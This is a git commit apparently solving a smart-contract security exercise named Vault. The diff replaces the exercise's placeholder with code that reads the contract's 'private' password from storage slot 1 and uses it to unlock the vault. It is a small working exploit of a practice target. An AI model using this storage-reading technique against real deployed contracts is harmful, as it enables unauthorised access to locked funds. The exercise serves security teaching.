3b967d9f8fc28474433eaf78282c834b7b11109b
sraylr <ogjkerr@gmail.com>
2022-07-03 07:46:55 -0700

    challenge 4

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -2,12 +2,10 @@ import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  const provider = waffle.provider;
+  const password = await provider.getStorageAt(victim.address, 1);
+
+  await victim.unlock(password);
 };
 
 export default helper;
